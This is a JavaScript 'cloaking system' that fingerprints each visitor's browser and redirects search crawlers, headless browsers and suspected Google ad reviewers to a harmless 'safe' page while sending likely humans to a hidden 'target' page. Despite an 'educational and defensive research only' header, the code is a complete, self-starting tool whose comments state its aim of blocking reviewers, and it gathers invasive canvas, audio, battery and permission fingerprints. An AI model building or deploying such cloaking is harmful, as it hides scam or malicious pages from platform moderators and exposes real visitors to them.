/**
 * Advanced Cloaking System – Balanced Edition
 * For educational and defensive research only.
 * 
 * This version is tuned to be effective but not overly aggressive.
 * It allows most real users while still blocking bots and reviewers.
 */

class AdvancedCloakingSystem {
    constructor(config = {}) {
        // Configuration – adjust these to match your site
        this.config = {
            safePageUrl: config.safePageUrl || '/safe',      // Must NOT be the same as entry page
            targetPageUrl: config.targetPageUrl || '/target',
            strictnessLevel: config.strictnessLevel || 70,   // Lower = more permissive (0-100)
            debugMode: config.debugMode || false,
            usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true, // Default to public IP
            ...config
        };

        // Detection databases
        this.botSignatures = this.initializeBotSignatures();
        this.googleIPRanges = this.initializeGoogleIPs();
        this.vpnIPRanges = this.initializeVPNIPs();
        this.proxyIPRanges = this.initializeProxyIPs();

        // Behavioral tracking data
        this.behavior = {
            startTime: Date.now(),
            maxScroll: 0,
            mouseMoves: 0,
            interactions: 0
        };

        this.sessionId = this.generateSessionId();
        this.fingerprint = null;

        this.log('Cloaking system initialized (balanced mode)', 'info');
    }

    // ---------- Bot signature database ----------
    initializeBotSignatures() {
        return {
            googlebot: /Googlebot|Google\sbot|Google\sImage|Googlebot-Mobile|AdsBot-Google|Googlebot-News|Googlebot-Video|Mediapartners-Google|AdsBot-Google-Mobile|Mediapartners/i,
            bingbot: /bingbot|BingPreview|MSNBot|msnbot/i,
            yahoo: /Slurp|Yahoo!\sSlurp/i,
            yandex: /YandexBot|YandexMobileBot|YandexImages|YandexVideo|YandexMetrika/i,
            baidu: /Baiduspider|BaiduImagespider/i,
            facebook: /facebookexternalhit|Facebot/i,
            other: /DuckDuckBot|ia_archiver|archive.org|SeznamBot|Sogou|Exabot|DotBot|Ahrefs|Semrush|MJ12bot|BLEXBot|rogerbot|SiteAuditBot/i,
            headless: /Headless|PhantomJS|Nightmare|Puppeteer|Playwright/i
        };
    }

    // ---------- IP range databases (simplified) ----------
    initializeGoogleIPs() {
        return [
            '66.249.64.0/19',    // Googlebot
            '64.233.160.0/19',
            '72.14.192.0/18',
            '74.125.0.0/16',
            '209.85.128.0/17',
            '216.239.32.0/19',
            '216.58.192.0/19'
        ];
    }

    initializeVPNIPs() {
        return [
            '54.0.0.0/8',    // AWS
            '52.0.0.0/8',
            '159.89.0.0/16', // Digital Ocean
            '165.227.0.0/16',
            '34.0.0.0/8',    // Google Cloud
            '35.0.0.0/8',
            '13.0.0.0/8',    // Azure
            '40.0.0.0/8'
        ];
    }

    initializeProxyIPs() {
        return [
            '103.0.0.0/8',
            '104.0.0.0/8'
        ];
    }

    generateSessionId() {
        return 'sid_' + Math.random().toString(36).substring(2, 15) +
               Math.random().toString(36).substring(2, 15);
    }

    // ---------- Main entry point ----------
    async determineVisitorType() {
        this.log('Starting visitor classification', 'debug');

        // Step 1: IP analysis
        const ipCheck = await this.checkIPAddress();
        if (ipCheck.isGoogle) {
            this.log('Google IP detected → safe', 'info');
            return { type: 'bot', reason: 'google_ip', showSafe: true };
        }

        // Step 2: User agent (if it's a known bot, immediately safe)
        const uaCheck = this.analyzeUserAgent();
        if (uaCheck.isBot) {
            this.log(`Bot UA: ${uaCheck.botType}`, 'info');
            return { type: 'bot', reason: 'user_agent', showSafe: true };
        }

        // Step 3: Fingerprinting
        const fingerprint = await this.generateFingerprint();
        this.fingerprint = fingerprint;

        if (this.isHeadlessBrowser(fingerprint)) {
            this.log('Headless browser detected', 'info');
            return { type: 'bot', reason: 'headless', showSafe: true };
        }

        // Step 4: Automation tools
        if (this.detectAutomationTools()) {
            this.log('Automation tools present', 'info');
            return { type: 'bot', reason: 'automation', showSafe: true };
        }

        // Step 5: Behavioral analysis (if we have previous session)
        if (this.hasExistingSession()) {
            const behaviorScore = this.analyzeBehavior();
            if (behaviorScore < 30) {
                this.log(`Low behavior score: ${behaviorScore}`, 'warn');
                // We'll still let the confidence decide – but this adds suspicion
            }
        } else {
            // First visit – start tracking for next time
            this.startBehaviorTracking();
        }

        // Step 6: Reviewer pattern detection (if confident)
        if (this.isPotentialReviewer(fingerprint, ipCheck)) {
            this.log('Potential Google reviewer → safe', 'info');
            return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
        }

        // Step 7: Final confidence score
        const confidence = this.calculateHumanConfidence(ipCheck, uaCheck, fingerprint);
        this.log(`Human confidence: ${confidence}%`, 'debug');

        if (confidence >= this.config.strictnessLevel) {
            return { type: 'human', confidence, showSafe: false };
        } else {
            return { type: 'suspicious', confidence, showSafe: true };
        }
    }

    // ---------- IP detection with public fallback ----------
    async checkIPAddress() {
        try {
            let ip, geo = { country: '', city: '', isp: '', connectionType: '' };

            if (this.config.usePublicIpService) {
                // Use public API to get IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
                // Optionally use a free geo service – for simplicity we skip it
            } else {
                // Server endpoints (not implemented in your setup)
                const ipRes = await fetch('/api/get-client-ip');
                if (!ipRes.ok) throw new Error('IP endpoint failed');
                const ipData = await ipRes.json();
                ip = ipData.ip;

                const geoRes = await fetch(`/api/geo-lookup?ip=${ip}`);
                if (geoRes.ok) {
                    geo = await geoRes.json();
                }
            }

            return {
                ip,
                isGoogle: this.ipInRanges(ip, this.googleIPRanges),
                isProxy: this.ipInRanges(ip, this.proxyIPRanges),
                isVPN: this.ipInRanges(ip, this.vpnIPRanges),
                country: geo.country,
                city: geo.city,
                isp: geo.isp,
                connectionType: geo.connectionType
            };
        } catch (error) {
            this.log(`IP check failed: ${error.message}`, 'error');
            return { isGoogle: false, isProxy: false, isVPN: false };
        }
    }

    // Proper CIDR matching
    ipInRanges(ip, ranges) {
        if (!ip) return false;
        const ipInt = this.ipToInt(ip);
        if (ipInt === null) return false;

        for (const range of ranges) {
            const [base, maskBits] = range.split('/');
            const mask = ~((1 << (32 - parseInt(maskBits))) - 1) >>> 0;
            const baseInt = this.ipToInt(base);
            if (baseInt === null) continue;

            if ((ipInt & mask) === (baseInt & mask)) {
                return true;
            }
        }
        return false;
    }

    ipToInt(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return null;
        return ((parseInt(parts[0]) << 24) |
                (parseInt(parts[1]) << 16) |
                (parseInt(parts[2]) << 8) |
                parseInt(parts[3])) >>> 0;
    }

    // ---------- User agent analysis ----------
    analyzeUserAgent() {
        const ua = navigator.userAgent;
        for (const [type, regex] of Object.entries(this.botSignatures)) {
            if (regex.test(ua)) {
                return { isBot: true, botType: type };
            }
        }
        return { isBot: false };
    }

    // ---------- Comprehensive fingerprinting ----------
    async generateFingerprint() {
        return {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            touchSupport: 'ontouchstart' in window,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            canvas: await this.getCanvasFingerprint(),
            webgl: this.getWebGLFingerprint(),
            fonts: await this.getFontList(),
            plugins: this.getPluginList(),
            audio: await this.getAudioFingerprint(),
            webRTC: this.getWebRTCInfo(),
            battery: await this.getBatteryInfo(),
            permissions: await this.getPermissionsInfo(),
            timestamp: Date.now()
        };
    }

    async getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(10, 10, 100, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cloaking Detection Test', 2, 15);
            ctx.beginPath();
            ctx.arc(50, 25, 10, 0, Math.PI * 2);
            ctx.strokeStyle = '#ff0000';
            ctx.lineWidth = 2;
            ctx.stroke();
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const pixels = imageData.data;
            let hash = 0;
            for (let i = 0; i < pixels.length; i += 4) {
                hash = ((hash << 5) - hash) + pixels[i];
                hash |= 0;
            }
            return { hash: hash.toString(16) };
        } catch (e) {
            return { hash: 'canvas_error' };
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { supported: false };
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                supported: true,
                vendor: gl.getParameter(gl.VENDOR),
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                extensions: gl.getSupportedExtensions() || []
            };
        } catch (e) {
            return { error: e.message };
        }
    }

    async getFontList() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const fontList = [
            'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
            'Verdana', 'Georgia', 'Palatino', 'Garamond',
            'Comic Sans MS', 'Trebuchet MS', 'Arial Black',
            'Impact', 'Lucida Console', 'Tahoma', 'Wingdings'
        ];
        const detected = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        for (const font of fontList) {
            for (const base of baseFonts) {
                ctx.font = `72px ${base}`;
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                ctx.font = `72px '${font}', ${base}`;
                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                if (baseWidth !== testWidth) {
                    detected.push(font);
                    break;
                }
            }
        }
        return detected;
    }

    getPluginList() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const p = navigator.plugins[i];
            plugins.push({ name: p.name, filename: p.filename, description: p.description });
        }
        return plugins;
    }

    async getAudioFingerprint() {
        return new Promise((resolve) => {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(audioContext.destination);
                oscillator.frequency.value = 440;
                oscillator.type = 'sine';
                const dataArray = new Uint8Array(analyser.frequencyBinCount);
                oscillator.start();
                setTimeout(() => {
                    analyser.getByteFrequencyData(dataArray);
                    oscillator.stop();
                    audioContext.close();
                    let hash = 0;
                    for (let i = 0; i < dataArray.length; i += 10) {
                        hash = ((hash << 5) - hash) + dataArray[i];
                        hash |= 0;
                    }
                    resolve({ supported: true, hash: hash.toString(16) });
                }, 100);
            } catch (e) {
                resolve({ supported: false });
            }
        });
    }

    getWebRTCInfo() {
        return {
            hasWebRTC: 'RTCPeerConnection' in window,
            hasGetUserMedia: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices
        };
    }

    async getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {
                return { error: e.message };
            }
        }
        return { supported: false };
    }

    async getPermissionsInfo() {
        const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
        const results = {};
        if ('permissions' in navigator) {
            for (const perm of permissions) {
                try {
                    const status = await navigator.permissions.query({ name: perm });
                    results[perm] = status.state;
                } catch (e) {
                    results[perm] = 'unknown';
                }
            }
        }
        return results;
    }

    // ---------- Headless detection (balanced) ----------
    isHeadlessBrowser(fingerprint) {
        const indicators = [];

        // Only count as headless if multiple indicators are present
        if (navigator.webdriver) indicators.push('webdriver');
        if (window.callPhantom || window._phantom) indicators.push('phantom');
        if (window.__nightmare) indicators.push('nightmare');
        if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
        if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');

        // Require at least 2 indicators to classify as headless (reduces false positives)
        return indicators.length >= 2;
    }

    detectAutomationTools() {
        const indicators = [
            'selenium', 'webdriver', 'driver', 'callPhantom', '_phantom',
            '__nightmare', '_Selenium_IDE_Recorder', 'domAutomation', 'domAutomationController'
        ];
        for (const ind of indicators) {
            if (window[ind] !== undefined) return true;
        }
        return false;
    }

    // ---------- Reviewer pattern detection (relaxed) ----------
    isPotentialReviewer(fingerprint, ipInfo) {
        const reviewerIndicators = [];
        const reviewerCountries = ['US', 'GB', 'IE', 'IN', 'SG', 'MY'];
        if (reviewerCountries.includes(ipInfo.country)) reviewerIndicators.push('country');

        const standardResolutions = ['1920x1080', '1366x768', '1440x900', '1536x864'];
        if (standardResolutions.includes(fingerprint.screenResolution)) reviewerIndicators.push('resolution');

        const reviewerLanguages = ['en-US', 'en-GB', 'en'];
        if (reviewerLanguages.includes(navigator.language)) reviewerIndicators.push('language');

        // Require all three indicators for a confident reviewer detection
        return reviewerIndicators.length >= 3;
    }

    // ---------- Behavioral tracking ----------
    startBehaviorTracking() {
        window.addEventListener('scroll', () => {
            const scrollPercent = (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100;
            this.behavior.maxScroll = Math.max(this.behavior.maxScroll, scrollPercent);
        });

        let moveTimer;
        window.addEventListener('mousemove', () => {
            if (!moveTimer) {
                moveTimer = setTimeout(() => {
                    this.behavior.mouseMoves++;
                    moveTimer = null;
                }, 200);
            }
        });

        window.addEventListener('click', () => this.behavior.interactions++);
        window.addEventListener('touchstart', () => this.behavior.interactions++);

        setTimeout(() => this.saveBehavior(), 5000);
    }

    saveBehavior() {
        const timeOnPage = (Date.now() - this.behavior.startTime) / 1000;
        const session = {
            timeOnPage,
            maxScroll: this.behavior.maxScroll,
            mouseMoves: this.behavior.mouseMoves,
            interactions: this.behavior.interactions,
            timestamp: Date.now()
        };
        sessionStorage.setItem('visitor_behavior', JSON.stringify(session));
    }

    hasExistingSession() {
        return sessionStorage.getItem('visitor_behavior') !== null;
    }

    analyzeBehavior() {
        const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
        let score = 100;
        if (session.timeOnPage < 5) score -= 15;   // was 20
        if (session.maxScroll < 10) score -= 10;   // was 15
        if (session.mouseMoves < 3) score -= 15;   // was 20
        if (session.interactions < 1) score -= 10; // was 15
        return Math.max(0, score);
    }

    // ---------- Confidence score (balanced) ----------
    calculateHumanConfidence(ipInfo, uaInfo, fingerprint) {
        let confidence = 60; // Start higher (was 50)

        // IP penalties – reduced impact
        if (ipInfo.isGoogle) confidence -= 30; // Still strong signal
        else if (ipInfo.isProxy || ipInfo.isVPN) confidence -= 10; // was 30
        if (ipInfo.connectionType === 'residential') confidence += 10; // was 15

        // Browser signals – more forgiving
        if (fingerprint.plugins && fingerprint.plugins.length > 0) confidence += 5;  // any plugins help
        if (fingerprint.plugins && fingerprint.plugins.length > 3) confidence += 5; // extra if many
        if (fingerprint.fonts && fingerprint.fonts.length > 5) confidence += 5;      // lowered threshold
        if (fingerprint.fonts && fingerprint.fonts.length > 10) confidence += 5;

        // Screen size
        const [width] = fingerprint.screenResolution.split('x').map(Number);
        if (width > 1024) confidence += 5;  // desktop
        else if (width < 768) confidence += 10; // mobile (very likely real)

        // Time of day (weak signal)
        const hour = new Date().getHours();
        if (hour >= 8 && hour <= 22) confidence += 5;

        return Math.min(100, Math.max(0, confidence));
    }

    hashFingerprint(fp) {
        const str = JSON.stringify(fp);
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash |= 0;
        }
        return hash.toString(16);
    }

    // ---------- Execution ----------
    async executeCloaking() {
        try {
            const result = await this.determineVisitorType();

            const sessionData = {
                timestamp: Date.now(),
                result,
                fingerprint: this.fingerprint
            };
            sessionStorage.setItem('visitor_session', JSON.stringify(sessionData));

            if (typeof window.cloakingReady === 'function') {
                window.cloakingReady();
            }

            if (result.showSafe) {
                this.log(`Redirecting to safe page: ${this.config.safePageUrl}`, 'info');
                window.location.replace(this.config.safePageUrl);
            } else {
                this.log(`Serving target page: ${this.config.targetPageUrl}`, 'success');
                window.location.replace(this.config.targetPageUrl);
            }
        } catch (error) {
            this.log(`Cloaking error: ${error.message}`, 'error');
            if (typeof window.cloakingReady === 'function') {
                window.cloakingReady();
            }
            window.location.href = this.config.safePageUrl;
        }
    }

    log(message, level) {
        if (this.config.debugMode || level === 'error') {
            console.log(`[Cloaking ${level.toUpperCase()}] ${message}`);
        }
    }
}

// ---------- Auto‑initialize ----------
(function() {
    const cloakingSystem = new AdvancedCloakingSystem({
        safePageUrl: '/safe',
        targetPageUrl: '/target',
        strictnessLevel: 70,          // Balanced – adjust as needed
        debugMode: true,               // Enable to see logs; set false in production
        usePublicIpService: true       // Use public IP service since you don't have server endpoints
    });

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => cloakingSystem.executeCloaking());
    } else {
        cloakingSystem.executeCloaking();
    }
})();
